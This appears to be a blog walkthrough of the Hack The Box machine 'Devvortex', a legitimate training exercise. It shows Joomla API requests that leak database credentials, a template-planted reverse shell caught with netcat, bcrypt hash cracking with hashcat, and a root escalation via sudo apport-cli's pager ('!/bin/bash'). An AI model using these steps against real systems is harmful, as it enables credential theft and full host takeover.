---
layout: post
title: Hack The Box Walkthrough - Devvortex
date: 2024-04-27
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/04/HTB/Devvortex
img: 2024/04/Devvortex/Devvortex.png
---

In this box, I used a known vulnerability to extract the database credentials from a Joomla application. The credentials were reused to connect to the site. I used them to login and get a shell through the Joomla templates. I found another user password in the database, and finally exploited a known vulnerability in a crash reporting application to get root.

* Room: Devvortex
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Devvortex](https://app.hackthebox.com/machines/Devvortex)
* Author: [7u9y](https://app.hackthebox.com/users/260996)

## Enumeration

I began the machine by running Rustscan to check for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.12.8:22
Open 10.129.12.8:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 08:26 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.

...

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

There were two: 22 (SSH) and 80 (HTTP). I also ran a scan for UDP ports, it did not find anything.

Nmap identified the server as running Ubuntu. Nginx was redirecting the web traffic to 'http://devvortex.htb/', so I added 'devvortex.htb' to my hosts file and scanned for subdomains with `wfuzz`.


```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 10 -H "Host:FUZZ.devvortex.htb" "http://devvortex.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 653911

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000136086:   200        501 L    1581 W     23221 Ch    "dev"

Total time: 0
Processed Requests: 653911
Filtered Requests: 653910
Requests/sec.: 0
```

It found 'dev.devvortex.htb'. I also added that domain to my hosts file.

## Main Website

I launched a browser and looked at the site on 'http://devvortex.htb'.

![Main Website](/assets/images/2024/04/Devvortex/Website.png "Main Website")

This was a simple site. It appeared to have only static pages. The site had a contact form, and a form to subscribe to a newsletter. Both only refreshed the page without submitting any data to the server.

I ran Feroxbuster on it to detect hidden pages.

```bash
$ feroxbuster -u http://devvortex.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://devvortex.htb/js => http://devvortex.htb/js/
301      GET        7l       12w      178c http://devvortex.htb/css => http://devvortex.htb/css/
301      GET        7l       12w      178c http://devvortex.htb/images => http://devvortex.htb/images/
200      GET        6l       13w      639c http://devvortex.htb/images/quote.png
200      GET        6l       52w     1968c http://devvortex.htb/images/twitter.png
200      GET        6l       57w     1878c http://devvortex.htb/images/youtube.png
200      GET      229l      475w     6845c http://devvortex.htb/portfolio.html
200      GET       44l      290w    17183c http://devvortex.htb/images/c-1.png
200      GET      231l      545w     7388c http://devvortex.htb/about.html
200      GET       11l       39w     3419c http://devvortex.htb/images/d-4.png
200      GET        5l       12w      847c http://devvortex.htb/images/envelope-white.png
200      GET        9l       24w     2405c http://devvortex.htb/images/d-2.png
200      GET      100l      178w     1904c http://devvortex.htb/css/responsive.css
200      GET        5l       55w     1797c http://devvortex.htb/images/linkedin.png
200      GET        5l       48w     1493c http://devvortex.htb/images/fb.png
200      GET        7l       30w     2018c http://devvortex.htb/images/d-3.png
200      GET        3l       10w      667c http://devvortex.htb/images/telephone-white.png
200      GET        5l       23w     1217c http://devvortex.htb/images/location-white.png
200      GET      583l     1274w    18048c http://devvortex.htb/index.html
200      GET       87l      363w    24853c http://devvortex.htb/images/c-3.png
200      GET      714l     1381w    13685c http://devvortex.htb/css/style.css
200      GET       11l       50w     2892c http://devvortex.htb/images/d-1.png
200      GET      536l     2364w   201645c http://devvortex.htb/images/who-img.jpg
200      GET      254l      520w     7603c http://devvortex.htb/do.html
200      GET      636l     3934w   306731c http://devvortex.htb/images/w-2.png
200      GET        2l     1276w    88145c http://devvortex.htb/js/jquery-3.4.1.min.js
200      GET      675l     4019w   330600c http://devvortex.htb/images/w-1.png
200      GET      583l     1274w    18048c http://devvortex.htb/
200      GET      536l     3109w   243112c http://devvortex.htb/images/w-3.png
403      GET        7l       10w      162c http://devvortex.htb/js/
403      GET        7l       10w      162c http://devvortex.htb/images/
200      GET      512l     2892w   241721c http://devvortex.htb/images/w-4.png
200      GET       71l      350w    24351c http://devvortex.htb/images/c-2.png
200      GET    10038l    19587w   192348c http://devvortex.htb/css/bootstrap.css
200      GET     4440l    10999w   131868c http://devvortex.htb/js/bootstrap.js
200      GET      289l      573w     8884c http://devvortex.htb/contact.html
403      GET        7l       10w      162c http://devvortex.htb/css/
200      GET      348l     2369w   178082c http://devvortex.htb/images/map-img.png
[####################] - 2m    478441/478441  0s      found:38      errors:4
[####################] - 2m    119601/119601  968/s   http://devvortex.htb/
[####################] - 2m    119601/119601  968/s   http://devvortex.htb/js/
[####################] - 2m    119601/119601  968/s   http://devvortex.htb/css/
[####################] - 2m    119601/119601  966/s   http://devvortex.htb/images/
```

It did not find anything interesting.

[Caido](https://caido.io/) was showing my browser making requests to 'leostop.com'. This was weird as HackTheBox machines usually use the 'htb' TLD. I added this domain to my hosts file and try navigating to it. It gave me the same website.

I searched for what was making this call. It turned out to be Bootstrap.

```js
$.ajax({
    type: "get",
    data: {
        surl: getURL()
    },
    success: function(response) {
        $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    }
});
```

I think it's pretty weird that Bootstrap tracks people on every site that use it, but it did not appear to be part of the box I needed to hack, so I moved on.

## Dev Site

Next, I opened the site on 'dev.devvortex.htb'.

![Dev Site](/assets/images/2024/04/Devvortex/DevSite.png "Dev Site")

I ran Feroxbuster on it. But the site had a 'robots.txt' that had a few folders to check.

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

The first entry was for an administrator section. I checked it, it was the login page for a Joomla site.

![Joomla](/assets/images/2024/04/Devvortex/Joomla.png "Joomla")

I tried simple credentials and SQL injection in the login page. That did not work. I looked for known Joomla vulnerabilities and quickly found an [unauthenticated information disclosure](https://www.exploit-db.com/exploits/51334) issue. I could use it to extract users and configurations from the site.

```bash
$ curl http://dev.devvortex.htb/api/index.php/v1/users\?public\=true | jq . > users.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   697    0   697    0     0    345      0 --:--:--  0:00:02 --:--:--   345

$ curl http://dev.devvortex.htb/api/index.php/v1/config/application\?public\=true  | jq . > config.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2010    0  2010    0     0    962      0 --:--:--  0:00:02 --:--:--   962
```

The configuration contained the credentials for the database.

```json
[
  {
    "type": "application",
    "id": "224",
    "attributes": {
      "dbtype": "mysqli",
      "id": 224
    }
  },
  {
    "type": "application",
    "id": "224",
    "attributes": {
      "host": "localhost",
      "id": 224
    }
  },
  {
    "type": "application",
    "id": "224",
    "attributes": {
      "user": "lewis",
      "id": 224
    }
  },
  {
    "type": "application",
    "id": "224",
    "attributes": {
      "password": "REDACTED",
      "id": 224
    }
  },
]
```

I tried to use those credentials with SSH, it failed. The user's data showed two users on the site.

```json
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
        "block": 0,
        "sendEmail": 1,
        "registerDate": "2023-09-25 16:44:24",
        "lastvisitDate": "2023-10-29 16:18:50",
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
        "block": 0,
        "sendEmail": 0,
        "registerDate": "2023-09-26 19:15:42",
        "lastvisitDate": null,
        "lastResetTime": null,
        "resetCount": 0,
        "group_count": 1,
        "group_names": "Registered"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}
```

The username 'lewis' matched the database credentials. I used the database password to connect as lewis to Joomla backend. It worked, and 'lewis' was a Super User on the site.

Once connected on the site, I looked for ways to get it to run arbitrary PHP code. First I tried uploading a PHP file in the media library, but that failed. I changed the configuration to allow PHP files as images. They were still getting rejected. And PHP code added to other file types was not executed.

I looked for ways to add code to pages. The post editor did not allow PHP code. I wanted to change the editor, but I found the templates first. The templating engine was running PHP. So I used it to add a reverse shell to the error template.

![Error Template](/assets/images/2024/04/Devvortex/ErrorTemplate.png "Error Template")

I started a netcat listener and navigated to a URL that did not exist. I got the shell back.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.49] from (UNKNOWN) [10.129.12.8] 54220
bash: cannot set terminal process group (829): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb$
```

## User logan

Once connected, I solidified my shell with the usual technique.

```bash
www-data@devvortex:~/dev.devvortex.htb$ python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
<ort pty; pty.spawn("/bin/bash")'; export TERM=xterm

www-data@devvortex:~/dev.devvortex.htb$ ^Z
[1]  + 67155 suspended  nc -klvnp 4444

$ stty -a
speed 38400 baud; rows 54; columns 235; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

$ stty raw -echo; fg
[1]  + 67155 continued  nc -klvnp 4444

www-data@devvortex:~/dev.devvortex.htb$ stty rows 54 cols 235
```

I took a quick look around, but as 'www-data' I could not do much on the server. I had the database credentials, so I used them to look at what the database contained.

```sql
www-data@devvortex:~/dev.devvortex.htb$ mysql -ulewis -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 51036
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |

...

| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> Select username, password From sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

It contained the credentials for two users. I already had lewis' password. I save logan's password hash to a file and used `hashcat` to crack it.

```bash
$ hashcat -a0 -m3200 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sat Feb 10 10:27:50 2024 (14 secs)
Time.Estimated...: Sat Feb 10 10:28:04 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      101 H/s (10.88ms) @ Accel:6 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1404/14344384 (0.01%)
Rejected.........: 0/1404 (0.00%)
Restore.Point....: 1368/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: lacoste -> harry
Hardware.Mon.#1..: Util: 96%

Started: Sat Feb 10 10:27:13 2024
Stopped: Sat Feb 10 10:28:06 2024
```

It got cracked in less than a minute. I used it to SSH as logan and read the user flag.

```bash
$ ssh logan@target
logan@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 10 Feb 2024 03:28:55 PM UTC

  System load:           0.0
  Usage of /:            69.3% of 4.76GB
  Memory usage:          22%
  Swap usage:            0%

...

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23

logan@devvortex:~$ cat user.txt
REDACTED
```

## Getting root

Once I was connected as logan, I looked at what they could to with `sudo`.

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli


logan@devvortex:~$ file /usr/bin/apport-cli
/usr/bin/apport-cli: Python script, ASCII text executable
```

They could run [apport-cli](https://manpages.ubuntu.com/manpages/focal/en/man1/apport-cli.1.html) which is an utility to create crash report to send them to developers. I quickly found a [known vulnerability](https://github.com/diego-tella/CVE-2023-1326-PoC) in it. Then POC requires a crash report already created to work. But you can create one with the tool. And the issue can be exploited during the creation.

The vulnerability is that `less` is used to display the report in multiple pages. And `less` allow running commands by prefixing them with `!`. All I needed to do was to create a report with the application, request to view the report, and launch `bash` from the pager that was used.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

***

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue...
.dpkg-query: no packages found matching xorg
..............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
== ApportVersion =================================
2.20.11-0ubuntu27

== Architecture =================================
amd64

== CasperMD5CheckResult =================================
skip

== Date =================================
Sun Feb 11 14:03:35 2024

== DistroRelease =================================
Ubuntu 20.04

== Package =================================
xorg (not installed)

== ProblemType =================================
Bug

== ProcCpuinfoMinimal =================================
processor       : 1
vendor_id       : AuthenticAMD
cpu family      : 25
model           : 1
model name      : AMD EPYC 7763 64-Core Processor
stepping        : 1
microcode       : 0xa0011d1
cpu MHz         : 2445.405
cache size      : 512 KB
physical id     : 2
siblings        : 1
core id         : 0
cpu cores       : 1
apicid          : 2
initial apicid  : 2
fpu             : yes
fpu_exception   : yes
cpuid level     : 16
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat pku ospke overflow_recov succor
bugs            : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass
bogomips        : 4890.81
TLB size        : 2560 4K pages
clflush size    : 64
cache_alignment : 64
address sizes   : 43 bits physical, 48 bits virtual
power management:

== ProcEnviron =================================
:!/bin/bash
root@devvortex:/home/logan# cat /root/root.txt
REDACTED
```